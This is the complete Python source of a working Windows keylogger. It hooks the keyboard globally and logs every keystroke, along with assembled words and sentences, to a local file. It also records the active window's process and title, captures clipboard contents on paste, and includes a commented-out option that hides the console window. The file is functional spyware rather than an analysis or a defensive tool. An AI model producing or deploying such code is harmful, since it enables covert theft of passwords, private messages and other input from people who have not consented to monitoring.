# author:       Rebecca Ramnauth
# last update:  07 January 2020

from ctypes import *
import win32api, win32console, win32clipboard, win32gui 
import pythoncom, pyHook, sys, logging

# uncomment to hide console
# win = win32console.GetConsoleWindow() 
# win32gui.ShowWindow(win, 0) 

sentence_level = True;
word_level = True;
character_level = True;
action_level = True;

running_sentence = "";
running_word = "";

file_log = 'keys.txt' # location of file to write keys to

current_window = None
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(asctime)s --- %(message)s')
logging.log(10, "[ ACTION ] --- [ KEYLOGGER INITIALIZED (sentence=" + str(sentence_level) + ", word=" + str(word_level) + ", character=" + str(character_level) + ", action=" + str(action_level) + ") ]")
print("keylogging in process")

def get_current_process():

    # get a handle to the foreground window
    hwnd = user32.GetForegroundWindow()

    # find the process ID
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))

    # store the current process ID
    process_id = "%d" % pid.value

    # grab the executable
    executable = create_string_buffer(512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)

    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)

    # now read its title
    window_title = create_string_buffer(512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)

    # print out the header if we're in the right process
    logging.log(10, "[ ACTION ] --- [ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    # print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))

    # close handles
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

def KeyStroke(event):
    
    global current_window
    global running_sentence
    global running_word

    # check to see if target changed windows
    if action_level and (event.WindowName != current_window):
        current_window = event.WindowName
        get_current_process()

    # if they pressed a standard letter key
    if event.Ascii > 32 and event.Ascii < 127:
        if character_level: logging.log(10, "[ CHARACTER ] --- [ " + chr(event.Ascii) + " ]")
        if sentence_level: running_sentence += chr(event.Ascii)
        if word_level: running_word += chr(event.Ascii)

    # if [Ctrl-V], get value on the clipboard
    elif action_level and event.Key == "V":
        win32clipboard.OpenClipboard()
        pasted_value = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        logging.log(10, "[ ACTION ] --- [ PASTE ] - %s" %(pasted_value))

    # if non-standard key, determine if action, word, sentence
    else: # TODO: punctuation at sentence level is a bit finicky
        if character_level: logging.log(10, "[ CHARACTER ] --- [ %s ]" % event.Key)
        if event.Key == 'Return': 
            if sentence_level and running_sentence!="": logging.log(10, "[ SENTENCE ] --- [ " + running_sentence + " ]")
            if word_level and running_word!="": logging.log(10, "[ WORD ] --- [ " + running_word + " ]")
            running_sentence = ""
            running_word = ""
        elif event.Key == 'Back': # TODO: account for 'DELETE'
            running_sentence = running_sentence[:-1]
            running_word = running_word[:-1]
        elif event.Key == 'Space': 
            if word_level and running_word!="": logging.log(10, "[ WORD ] --- [ " + running_word + " ]")
            running_sentence += ' '
            running_word = ""

    # pass execution to the next registered hook 
    return True

# create and register a hook manager
hooks_manager = pyHook.HookManager() 
hooks_manager.KeyDown = KeyStroke # OnKeyboardEvent 

# register the hook and execute forever
hooks_manager.HookKeyboard()  
pythoncom.PumpMessages() 